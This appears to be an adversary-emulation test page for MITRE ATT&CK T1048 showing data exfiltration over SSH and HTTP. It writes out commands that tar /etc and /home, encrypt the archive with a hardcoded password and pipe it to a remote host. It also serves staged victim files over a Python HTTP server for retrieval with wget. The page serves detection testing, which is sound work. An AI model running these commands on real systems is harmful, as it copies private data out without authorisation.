## Exfiltration Over Alternative Protocol

MITRE ATT&CK Technique: [T1048](https://attack.mitre.org/wiki/Technique/T1048)

### SSH

Remote to Local:

    ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz

Local to Remote:

    tar czpf - /home/* | openssl des3 -salt -pass pass:1234 | ssh foo@example.com 'cat > /home.tar.gz.enc'

### HTTP

A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.

Victim System Configuration:

    mkdir /tmp/victim-staging-area
    echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt

Using Python to establish a one-line HTTP server on victim system:

    cd /tmp/victim-staging-area
    python -m SimpleHTTPServer 1337

To retrieve the data from an adversary system:

    wget http://VICTIM_IP:1337/victim-file.txt